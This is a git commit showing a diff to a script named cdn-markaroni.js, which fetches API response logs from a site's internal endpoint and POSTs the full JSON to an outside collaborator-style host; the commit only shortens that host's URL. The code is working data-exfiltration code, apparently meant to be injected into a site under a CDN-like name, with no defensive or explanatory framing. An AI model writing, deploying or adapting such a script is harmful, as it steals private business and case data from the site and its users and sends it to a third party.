b687fbd34e6712018bf8ef3d4465ff6006cc2710
marcusoft3 <marcusoft3@gmail.com>
2025-11-10 11:45:19 -0800

    Update cdn-markaroni.js
    removing extra text

--- cdn-markaroni.js
+++ cdn-markaroni.js
@@ -1,6 +1,6 @@
 fetch('/api/ApiResponceLogs/GetApiResponceLogs?BusinessName=3090&WorkflowName=&CaseId=&FromDate=10/28/2025&ToDate=10/28/2025&{}')
   .then(r => r.json())
-  .then(data => fetch('https://3rvc8c55nzwl67mklxnntlm3kuqleb20.collab.hawkislandsol.com/bigeye', {
+  .then(data => fetch('https://3rvc8c55nzwl67mklxnntlm3kuqleb20.collab.hawkislandsol.com', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(data)
